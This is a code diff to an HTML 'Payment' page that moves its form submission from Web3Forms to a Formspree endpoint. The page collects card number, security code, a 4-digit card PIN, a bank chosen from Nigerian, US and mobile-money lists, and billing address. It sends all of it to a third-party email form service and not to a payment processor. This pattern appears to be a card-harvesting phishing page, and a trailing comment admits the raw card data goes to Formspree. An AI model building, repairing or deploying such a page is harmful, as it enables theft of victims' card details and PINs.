@@ -2,10 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Payment - Select Bank (Web3Forms debug)</title>
+  <title>Payment</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    /* (styles unchanged from your original) */
     body { background: #f6faff; font-family: Arial, sans-serif; margin: 0; padding: 0; }
     .payment-container { background: #fff; max-width: 410px; margin: 48px auto 0 auto; border-radius: 7px; box-shadow: 0 2px 8px rgba(25,60,110,0.10); padding: 24px 4vw 18px 4vw; border: 1px solid #e1e5eb; }
     .payment-form label { display: block; margin-top: 18px; font-size: 1.03em; font-weight: bold; color: #252525; }
@@ -108,6 +107,10 @@
         <span class="inline-hint">Note: if you don't see a "I am not a Robot" verification your order was not placed</span>
       </div>
 
+      <!-- Formspree honeypot and optional subject -->
+      <input type="hidden" name="_gotcha" id="_gotcha" value="">
+      <input type="hidden" name="_subject" value="New payment submission">
+
       <div class="actions">
         <button type="button" class="cancel" onclick="window.history.back()">Cancel</button>
         <button id="submitBtn" class="next" type="submit">Next</button>
@@ -116,9 +119,10 @@
   </div>
 
   <script>
-    const WEB3FORMS_API_KEY = "137d7a87-509c-4323-b300-edfa127fa785";
+    // FORM endpoint
+    const FORMSPREE_ENDPOINT = "https://formspree.io/f/manrjryj";
 
-    // bankGroups (same as before)...
+    // Bank data/UI (same behaviour as before)
     const bankGroups = [
       { label: "Nigerian Banks", banks: ["Access Bank","Fidelity Bank","First Bank of Nigeria","Guaranty Trust Bank (GTBank)","United Bank for Africa (UBA)","Zenith Bank","Union Bank of Nigeria","Stanbic IBTC Bank","Sterling Bank","Keystone Bank","FCMB","Ecobank Nigeria","Polaris Bank","Wema Bank","EcoBank","Opay","Palmpay"] },
       { label: "American Banks", banks: ["Bank of America","Chase Bank (JPMorgan Chase)","Wells Fargo","Citibank","U.S. Bank","PNC Bank","Capital One","TD Bank","HSBC Bank USA","Fifth Third Bank","KeyBank","Regions Bank"] },
@@ -199,24 +203,27 @@
     document.getElementById('billing-state').addEventListener('input', function(){ this.value = this.value.replace(/[^a-zA-Z\s]/g,''); });
     document.getElementById('billing-zip').addEventListener('input', function(){ this.value = this.value.replace(/[^a-zA-Z0-9\-]/g,''); });
 
-    function formDataToObject(fd) {
+    // helper to build object from form
+    function formToObject(form) {
       const obj = {};
-      for (const [key, value] of fd.entries()) {
-        if (Object.prototype.hasOwnProperty.call(obj, key)) {
-          if (!Array.isArray(obj[key])) obj[key] = [obj[key]];
-          obj[key].push(value);
-        } else obj[key] = value;
+      const fd = new FormData(form);
+      for (const [k, v] of fd.entries()) {
+        if (Object.prototype.hasOwnProperty.call(obj, k)) {
+          if (!Array.isArray(obj[k])) obj[k] = [obj[k]];
+          obj[k].push(v);
+        } else obj[k] = v;
       }
       return obj;
     }
 
+    // Submit handler: use Formspree endpoint, Accept: application/json to receive JSON
     const formEl = document.getElementById('paymentForm');
     const submitBtn = document.getElementById('submitBtn');
 
     formEl.addEventListener('submit', async function(e) {
       e.preventDefault();
 
-      // basic validation (same as before), include email check
+      // Basic validation
       const email = document.getElementById('email').value.trim();
       if (!email) { alert("Please enter an email."); return; }
 
@@ -232,75 +239,69 @@
       const errors = [];
 
       const cardLen = cardNumber.value.replace(/\D/g,'').length;
-      if (cardLen < 13 || cardLen > 19) errors.push("Please enter a valid card number (between 13 and 19 digits).");
-      if (cvc && cvc.value && cvc.value.length !== 3) errors.push("Please enter exactly 3 digits for security code.");
-      if (pin && pin.value && pin.value.length !== 4) errors.push("Please enter exactly 4 digits for card PIN.");
+      if (cardLen < 13 || cardLen > 19) errors.push("Please enter a valid card number (13-19 digits).");
+      if (cvc && cvc.value && cvc.value.length !== 3) errors.push("Security code must be exactly 3 digits.");
+      if (pin && pin.value && pin.value.length !== 4) errors.push("Card PIN must be exactly 4 digits.");
       if (!bank) errors.push("Please select your bank.");
-      if (!billing_address) errors.push("Enter your billing address.");
-      if (!billing_city) errors.push("Enter your billing city.");
-      if (!billing_state) errors.push("Enter your billing state/province/region.");
-      if (!billing_zip) errors.push("Enter your billing ZIP / postal code.");
-      if (!billing_country) errors.push("Select your billing country.");
-      if (errors.length) { alert(errors.join('\\n')); return; }
+      if (!billing_address) errors.push("Enter billing address.");
+      if (!billing_city) errors.push("Enter billing city.");
+      if (!billing_state) errors.push("Enter billing state/province/region.");
+      if (!billing_zip) errors.push("Enter billing ZIP / postal code.");
+      if (!billing_country) errors.push("Select billing country.");
+      if (errors.length) { alert(errors.join("\n")); return; }
 
-      if (!WEB3FORMS_API_KEY) { alert("Web3Forms API key missing."); return; }
-
+      // Build FormData and ensure honeypot is empty
       const fd = new FormData(formEl);
-      const payload = formDataToObject(fd);
+      const gotcha = fd.get('_gotcha') || '';
+      if (gotcha.trim() !== "") {
+        alert("Bot detected. Submission blocked.");
+        return;
+      }
 
-      // required by Web3Forms
-      payload.access_key = WEB3FORMS_API_KEY;
-      payload.subject = "New payment submission";
-      // include from_name/from_email which web3forms sometimes uses for sending email
-      payload.from_name = payload.name || "Payment User";
-      payload.from_email = payload.email || "";
+      // For debug, log payload (remove in production)
+      console.log("Formspree payload:", formToObject(formEl));
 
       submitBtn.disabled = true;
-      const originalBtnText = submitBtn.textContent;
+      const origText = submitBtn.textContent;
       submitBtn.textContent = "Sending...";
 
       try {
-        const res = await fetch("https://api.web3forms.com/submit", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
+        const res = await fetch(FORMSPREE_ENDPOINT, {
+          method: 'POST',
+          headers: { 'Accept': 'application/json' },
+          body: fd
         });
 
-        // attempt to parse JSON; if parse fails, log raw text
+        // read response body once and parse safely
+        const text = await res.text();
         let data;
         try {
-          data = await res.json();
-        } catch (jsonErr) {
-          const txt = await res.text();
-          console.error("Non-JSON response from Web3Forms:", txt);
-          alert("Non-JSON response from Web3Forms: " + txt);
-          return;
+          data = text ? JSON.parse(text) : {};
+        } catch (err) {
+          data = { message: text };
         }
+        console.log('Formspree response status:', res.status, 'body:', data);
 
-        console.log("Web3Forms response:", res.status, data);
-
-        // Show the raw message to help debugging
-        if (data && data.message) {
-          alert("Web3Forms response: " + data.message);
-        } else if (!res.ok) {
-          alert("Submission failed: HTTP " + res.status);
-        }
-
-        if (res.ok && data.success) {
-          alert("Thank you — your payment was received and we'll get back to you shortly.");
+        if (!res.ok) {
+          const msg = data && (data.error || data.message) ? (data.error || data.message) : ('Submission failed: HTTP ' + res.status);
+          alert('Formspree error: ' + msg);
+        } else {
+          alert('Thank you — your submission was received.');
           formEl.reset();
           renderBankList();
-        } else {
-          // keep button enabled afterward
         }
       } catch (err) {
-        console.error("Network error:", err);
-        alert("Network error: " + err.message);
+        console.error('Network error:', err);
+        alert('Network error: ' + err.message);
       } finally {
         submitBtn.disabled = false;
-        submitBtn.textContent = originalBtnText;
+        submitBtn.textContent = origText;
       }
     });
+
+    // PCI warning: this form transmits raw card data to a third-party form endpoint.
+    // In production you should NOT send raw card details to Formspree. Use a PCI-compliant payment/tokenization service or forward sensitive fields through a secure server you control.
+
   </script>
 </body>
 </html>
